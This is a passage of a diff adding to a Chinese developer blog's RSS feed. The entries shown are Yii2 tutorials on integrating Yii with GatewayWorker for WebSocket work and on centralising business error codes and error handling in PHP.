+&lt;p&gt;在模块的控制器，加入&lt;code&gt;throw new BaseException(401);&lt;/code&gt;，然后请求接口；
+登录到控制台，点击对应的项目就可以查看到报错列表了。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://jadenhsiao.gitee.io/images/Snipaste_2022-07-20_09-35-13.jpg&#34; alt=&#34;项目详情&#34;&gt;&lt;/p&gt;
+&lt;p&gt;点击报错项，就可以查看到报错的具体信息了。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://jadenhsiao.gitee.io/images/Snipaste_2022-07-20_09-35-47.jpg&#34; alt=&#34;报错详情&#34;&gt;&lt;/p&gt;
+- https://jadenhsiao.gitee.io/post/yii2-skills-part-five/ - Jadenhsiao. 本站遵循 CC-BY-NC 4.0 协议</description>
+        </item>
+    
+    
+    
+        <item>
+        <title>Yii2使用技巧（四）- 将Yii整合到GatewayWorker</title>
+        <link>https://jadenhsiao.gitee.io/post/yii2-skills-part-four/</link>
+        <pubDate>Mon, 18 Jul 2022 15:29:28 +0800</pubDate>
+        
+        <guid>https://jadenhsiao.gitee.io/post/yii2-skills-part-four/</guid>
+        <description>JadenHsiao https://jadenhsiao.gitee.io/post/yii2-skills-part-four/ -&lt;blockquote&gt;
+&lt;p&gt;&lt;em&gt;Yii&lt;/em&gt;作为FPM框架，主要针对业务开发方面，因为本身并不支持网络层面编程，所以需要引入其他网络框架，这里我选择的是基于&lt;em&gt;WorkerMan&lt;/em&gt;的&lt;em&gt;GatewayWorker&lt;/em&gt;，来处理业务里需要的&lt;em&gt;WebSocket&lt;/em&gt;；但是我又想在&lt;em&gt;GatewayWorker&lt;/em&gt;中使用&lt;em&gt;Yii&lt;/em&gt;的例如&lt;em&gt;Active Record&lt;/em&gt;、&lt;em&gt;ArrayHelper&lt;/em&gt;等上手的特性，所以本篇文章将对于如何整个进行说明。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h2 id=&#34;一下载gatewayworker&#34;&gt;一、下载&lt;em&gt;GatewayWorker&lt;/em&gt;&lt;/h2&gt;
+&lt;p&gt;这里提供了&lt;a href=&#34;https://www.workerman.net/doc/gateway-worker/README.html&#34;&gt;下载&lt;em&gt;GatewayWorker&lt;/em&gt;&lt;/a&gt;的链接地址，下载后，将压缩包的内容解压到&lt;em&gt;Yii2&lt;/em&gt;的项目目录内。&lt;/p&gt;
+&lt;h2 id=&#34;二修改start_businessworkerphp&#34;&gt;二、修改&lt;em&gt;start_businessworker.php&lt;/em&gt;&lt;/h2&gt;
+&lt;blockquote&gt;
+&lt;p&gt;BusinessWorker类其实也是基于基础的Worker开发的。BusinessWorker是运行业务逻辑的进程，BusinessWorker收到Gateway转发来的事件及请求时会默认调用Events.php中的onConnect onMessage onClose方法处理事件及数据，开发者正是通过实现这些回调控制业务及流程。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;上述这段引用是&lt;em&gt;WorkerMan&lt;/em&gt;对于该生命周期中，业务逻辑处理所在位置的说明；所以&lt;em&gt;Yii&lt;/em&gt;的操作就在这个环节上；打开&lt;em&gt;Applications&lt;/em&gt;目录，修改&lt;em&gt;start_businessworker.php&lt;/em&gt;，加入以下代码块：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;?php
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;//...
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;require_once&lt;/span&gt; &lt;span style=&#34;color:#00688b&#34;&gt;__DIR__&lt;/span&gt; . &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;/../../vendor/autoload.php&amp;#39;&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;defined(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;YII_DEBUG&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;or&lt;/span&gt; define(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;YII_DEBUG&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;true&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;defined(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;YII_ENV&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;or&lt;/span&gt; define(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;YII_ENV&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;dev&amp;#39;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#00688b&#34;&gt;$config&lt;/span&gt; = &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;require&lt;/span&gt;(&lt;span style=&#34;color:#00688b&#34;&gt;__DIR__&lt;/span&gt; . &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;/../../config/web-socket.php&amp;#39;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;require&lt;/span&gt;(&lt;span style=&#34;color:#00688b&#34;&gt;__DIR__&lt;/span&gt; . &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;/../../vendor/yiisoft/yii2/Yii.php&amp;#39;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;(&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;new&lt;/span&gt; \yii\web\Application(&lt;span style=&#34;color:#00688b&#34;&gt;$config&lt;/span&gt;))-&amp;gt;&lt;span style=&#34;color:#658b00&#34;&gt;run&lt;/span&gt;();
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;if&lt;/span&gt;(!defined(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;GLOBAL_START&amp;#39;&lt;/span&gt;))
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Worker::&lt;span style=&#34;color:#658b00&#34;&gt;runAll&lt;/span&gt;();
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;在&lt;code&gt;Worker::runAll()&lt;/code&gt;，前面先引用&lt;em&gt;composer&lt;/em&gt;的自加载，然后&lt;code&gt;$config&lt;/code&gt;可以自己定义配置文件，再引入&lt;em&gt;Yii&lt;/em&gt;的核心文件，最后一步将其实例化即可，其实这个流程就和&lt;em&gt;Yii&lt;/em&gt;框架本身&lt;em&gt;public/index.php&lt;/em&gt;是一致的。&lt;/p&gt;
+&lt;h2 id=&#34;三用yii的编码风格编写gatewayworker的业务代码&#34;&gt;三、用&lt;em&gt;Yii&lt;/em&gt;的编码风格编写&lt;em&gt;GatewayWorker&lt;/em&gt;的业务代码&lt;/h2&gt;
+&lt;p&gt;在&lt;em&gt;Applications&lt;/em&gt;目录下的&lt;em&gt;Events.php&lt;/em&gt;中就可以愉快使用原先框架的模型文件进行增删改查，工具类函数进行数组操作了。&lt;/p&gt;
+&lt;p&gt;注意：引用类时需要使用完全限定名称，例如&lt;code&gt;use \app\models\Example;&lt;/code&gt;&lt;/p&gt;
+&lt;h2 id=&#34;参考链接&#34;&gt;参考链接&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://www.yiiframework.com/doc/guide/2.0/zh-cn/tutorial-yii-integration#using-yii-in-others&#34;&gt;在第三方系统内使用 Yii&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://www.php.net/manual/zh/language.namespaces.dynamic.php&#34;&gt;命名空间和动态语言特征&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://www.workerman.net/doc/gateway-worker/README.html&#34;&gt;GatewayWorker&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+- https://jadenhsiao.gitee.io/post/yii2-skills-part-four/ - Jadenhsiao. 本站遵循 CC-BY-NC 4.0 协议</description>
+        </item>
+    
+    
+    
+        <item>
+        <title>Yii2使用技巧（三）- 优雅处理业务错误</title>
+        <link>https://jadenhsiao.gitee.io/post/yii2-skills-part-three/</link>
+        <pubDate>Mon, 18 Jul 2022 09:50:28 +0800</pubDate>
+        
+        <guid>https://jadenhsiao.gitee.io/post/yii2-skills-part-three/</guid>
+        <description>JadenHsiao https://jadenhsiao.gitee.io/post/yii2-skills-part-three/ -&lt;blockquote&gt;
+&lt;p&gt;错误提示是程序运行重要的一环，可以让开发者及时知晓出错的位置和原因，但是在编码的时候，因拦截错误所编写的大量&lt;em&gt;try catch&lt;/em&gt;会让代码后期难以维护，所以这里将会针对&lt;em&gt;Yii&lt;/em&gt;，对程序的错误提示进行统一处理。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h2 id=&#34;一准备错误码类&#34;&gt;一、准备错误码类&lt;/h2&gt;
+&lt;p&gt;在对应的模块目录下先创建一个&lt;em&gt;exception&lt;/em&gt;的目录，用于放置我们处理错误的逻辑内容；在该目录下创建一个名为&lt;em&gt;ErrorCodes.php&lt;/em&gt;的文件，该文件主要是放置错误码列表，一些通用的错误将通过该列表获取返回；代码如下：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;?php
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;namespace&lt;/span&gt; app\modules\example\exception;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#008b45;font-weight:bold&#34;&gt;ErrorCodes&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#cd5555&#34;&gt;/**
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#cd5555&#34;&gt;         * 错误码列表
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#cd5555&#34;&gt;         * @return array
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#cd5555&#34;&gt;         */&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#008b45&#34;&gt;errorCodeList&lt;/span&gt;()
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;return&lt;/span&gt; [
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#b452cd&#34;&gt;401&lt;/span&gt; =&amp;gt; &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;Access Token 无效&amp;#34;&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#b452cd&#34;&gt;403&lt;/span&gt; =&amp;gt; &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;该 App ID 已被封禁，请联系管理员&amp;#34;&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#b452cd&#34;&gt;429&lt;/span&gt; =&amp;gt; &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;请求次数过多，请稍后再试&amp;#34;&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#b452cd&#34;&gt;500&lt;/span&gt; =&amp;gt; &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;服务器内容错误&amp;#34;&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#228b22&#34;&gt;// TODO 其他的错误信息可以根据错误码内容写入
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;                &lt;span style=&#34;color:#b452cd&#34;&gt;101001&lt;/span&gt; =&amp;gt; &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;生成 Access Token 失败&amp;#34;&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            ];
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;上面的代码里放置了几个比较通用的错误码和提示语，这里可以根据业务需求进行自定义。&lt;/p&gt;
+&lt;h2 id=&#34;二重写yii错误控制类&#34;&gt;二、重写&lt;em&gt;Yii&lt;/em&gt;错误控制类&lt;/h2&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-xml&#34; data-lang=&#34;xml&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;&amp;lt;response&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;&amp;lt;name&amp;gt;&lt;/span&gt;OK&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;&amp;lt;/name&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;&amp;lt;message&amp;gt;&lt;/span&gt;Access Token 无效&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;&amp;lt;/message&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;&amp;lt;code&amp;gt;&lt;/span&gt;401&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;&amp;lt;/code&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;&amp;lt;status&amp;gt;&lt;/span&gt;200&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;&amp;lt;/status&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;&amp;lt;type&amp;gt;&lt;/span&gt;app\modules\api\exception\BaseException&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;&amp;lt;/type&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;&amp;lt;/response&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;上面的代码块原先&lt;em&gt;ErrorHandle&lt;/em&gt;返回的内容，而该模块主要是提供给APP做接口调用，所以在返回内容需要较为简洁，因此需要重写&lt;em&gt;Yii&lt;/em&gt;的&lt;em&gt;ErrorHandler&lt;/em&gt;；&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;?php
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;namespace&lt;/span&gt; app\modules\api\exception;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;use&lt;/span&gt; yii\web\ErrorHandler &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;as&lt;/span&gt; BaseErrorHandle;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#008b45;font-weight:bold&#34;&gt;ErrorHandler&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;extends&lt;/span&gt; BaseErrorHandle
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#cd5555&#34;&gt;/**
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#cd5555&#34;&gt;     * 错误处理
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#cd5555&#34;&gt;     * @param \Error|\Exception $exception
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#cd5555&#34;&gt;     * @return array
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#cd5555&#34;&gt;     */&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#008b45&#34;&gt;convertExceptionToArray&lt;/span&gt;(&lt;span style=&#34;color:#00688b&#34;&gt;$exception&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#00688b&#34;&gt;$value&lt;/span&gt; = &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;parent&lt;/span&gt;::&lt;span style=&#34;color:#658b00&#34;&gt;convertExceptionToArray&lt;/span&gt;(&lt;span style=&#34;color:#00688b&#34;&gt;$exception&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;return&lt;/span&gt; [
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;code&amp;#39;&lt;/span&gt; =&amp;gt; &lt;span style=&#34;color:#00688b&#34;&gt;$value&lt;/span&gt;[&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;code&amp;#39;&lt;/span&gt;],
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;message&amp;#39;&lt;/span&gt; =&amp;gt; &lt;span style=&#34;color:#00688b&#34;&gt;$value&lt;/span&gt;[&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;message&amp;#39;&lt;/span&gt;]
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        ];
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;上面的代码块重写了错误渲染结果，只返回了错误码和信息；处理之后的结果如下：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-xml&#34; data-lang=&#34;xml&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;&amp;lt;response&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;&amp;lt;code&amp;gt;&lt;/span&gt;401&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;&amp;lt;/code&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;&amp;lt;message&amp;gt;&lt;/span&gt;Access Token 无效&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;&amp;lt;/message&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;&amp;lt;/response&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;三编写业务代码使用的错误基类&#34;&gt;三、编写业务代码使用的错误基类&lt;/h2&gt;
+&lt;p&gt;编写这一块主要是为了给业务使用，方便根据错误码来返回对应信息。
+&lt;em&gt;Exception.php&lt;/em&gt;为错误基类，这个类继承了&lt;em&gt;Yii&lt;/em&gt;的&lt;em&gt;HttpException&lt;/em&gt;，该类可以对网络状态码进行设置，不用再进行其他响应操作。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;?php
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;namespace&lt;/span&gt; app\modules\api\exception;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;use&lt;/span&gt; yii\web\HttpException;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#008b45;font-weight:bold&#34;&gt;Exception&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;extends&lt;/span&gt; HttpException
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#cd5555&#34;&gt;/**
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#cd5555&#34;&gt;     * @var array $error_code_list 错误码列表
